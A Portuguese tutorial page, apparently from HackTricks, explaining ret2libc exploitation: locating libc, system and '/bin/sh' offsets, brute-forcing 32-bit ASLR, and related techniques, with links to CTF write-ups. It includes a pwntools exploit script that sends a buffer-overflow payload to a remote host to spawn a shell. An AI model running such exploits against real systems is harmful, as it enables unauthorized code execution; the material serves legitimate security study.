# Ret2lib

{{#include ../../../banners/hacktricks-training.md}}

## **Informações Básicas**

A essência do **Ret2Libc** é redirecionar o fluxo de execução de um programa vulnerável para uma função dentro de uma biblioteca compartilhada (por exemplo, **system**, **execve**, **strcpy**) em vez de executar shellcode fornecido pelo atacante na pilha. O atacante cria um payload que modifica o endereço de retorno na pilha para apontar para a função da biblioteca desejada, enquanto também organiza para que quaisquer argumentos necessários sejam configurados corretamente de acordo com a convenção de chamada.

### **Exemplo de Etapas (simplificado)**

- Obter o endereço da função a ser chamada (por exemplo, system) e o comando a ser chamado (por exemplo, /bin/sh)
- Gerar uma cadeia ROP para passar o primeiro argumento apontando para a string do comando e o fluxo de execução para a função

## Encontrando os endereços

- Supondo que a `libc` utilizada seja a da máquina atual, você pode encontrar onde ela será carregada na memória com:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Se você quiser verificar se o ASLR está mudando o endereço da libc, você pode fazer:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Sabendo a libc utilizada, também é possível encontrar o offset para a função `system` com:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Sabendo a libc utilizada, também é possível encontrar o deslocamento para a string `/bin/sh` com:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Sabendo a libc utilizada, também é possível usar Peda ou GEF para obter o endereço da função **system**, da função **exit** e da string **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se o processo está criando **filhos** toda vez que você fala com ele (servidor de rede), tente **ler** esse arquivo (provavelmente você precisará ser root).

Aqui você pode encontrar **exatamente onde a libc está carregada** dentro do processo e **onde será carregada** para cada filho do processo.

![](<../../../images/image (853).png>)

Neste caso, está carregada em **0xb75dc000** (Este será o endereço base da libc)

## Libc desconhecida

Pode ser possível que você **não saiba qual libc o binário está carregando** (porque pode estar localizado em um servidor onde você não tem acesso). Nesse caso, você poderia abusar da vulnerabilidade para **vazar alguns endereços e descobrir qual biblioteca libc** está sendo usada:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

E você pode encontrar um template do pwntools para isso em:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

### Conhecendo a libc com 2 offsets

Verifique a página [https://libc.blukat.me/](https://libc.blukat.me/) e use um **casal de endereços** de funções dentro da libc para descobrir a **versão utilizada**.

## Contornando ASLR em 32 bits

Esses ataques de força bruta são **úteis apenas para sistemas de 32 bits**.

- Se o exploit for local, você pode tentar forçar o endereço base da libc (útil para sistemas de 32 bits):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Se você estiver atacando um servidor remoto, pode tentar **forçar a descoberta do endereço da função `usleep` da `libc`**, passando como argumento 10 (por exemplo). Se em algum momento o **servidor levar 10s a mais para responder**, você encontrou o endereço dessa função.

## One Gadget

Execute um shell apenas pulando para **um** **endereço** específico na libc:

{{#ref}}
one-gadget.md
{{#endref}}

## Exemplo de Código x86 Ret2lib

Neste exemplo, a força bruta do ASLR está integrada no código e o binário vulnerável está localizado em um servidor remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Exemplo de Código

Verifique o exemplo de:

{{#ref}}
../
{{#endref}}

## Exemplo ARM64 Ret2lib

No caso do ARM64, a instrução ret salta para onde o registrador x30 está apontando e não para onde o registrador da pilha está apontando. Portanto, é um pouco mais complicado.

Além disso, no ARM64, uma instrução faz o que a instrução faz (não é possível saltar no meio das instruções e transformá-las em novas).

Verifique o exemplo de:

{{#ref}}
ret2lib-+-printf-leak-arm64.md
{{#endref}}

## Ret-into-printf (ou puts)

Isso permite **vazar informações do processo** chamando `printf`/`puts` com alguns dados específicos colocados como argumento. Por exemplo, colocar o endereço de `puts` no GOT em uma execução de `puts` irá **vazar o endereço de `puts` na memória**.

## Ret2printf

Isso basicamente significa abusar de um **Ret2lib para transformá-lo em uma vulnerabilidade de strings de formato `printf`** usando o `ret2lib` para chamar printf com os valores para explorá-lo (parece inútil, mas é possível):

{{#ref}}
../../format-strings/
{{#endref}}

## Outros Exemplos & referências

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, dado um vazamento para o endereço de uma função na libc, usando um gadget
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bits, ASLR habilitado, mas sem PIE, o primeiro passo é preencher um overflow até o byte 0x00 do canário para então chamar puts e vazá-lo. Com o canário, um gadget ROP é criado para chamar puts para vazar o endereço de puts do GOT e um gadget ROP para chamar `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR habilitado, sem canário, overflow de pilha na função principal de uma função filha. Gadget ROP para chamar puts para vazar o endereço de puts do GOT e então chamar um gadget.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bits, sem pie, sem canário, sem relro, nx. Usa a função write para vazar o endereço de write (libc) e chama um gadget.
- [https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html](https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html)
- Usa uma string de formato para vazar o canário da pilha e um buffer overflow para chamar system (está no GOT) com o endereço de `/bin/sh`.
- [https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html](https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html)
- 32 bits, sem relro, sem canário, nx, pie. Abusa de um indexação ruim para vazar endereços da libc e heap da pilha. Abusa do buffer overflow para fazer um ret2lib chamando `system('/bin/sh')` (o endereço da heap é necessário para contornar uma verificação).

{{#include ../../../banners/hacktricks-training.md}}
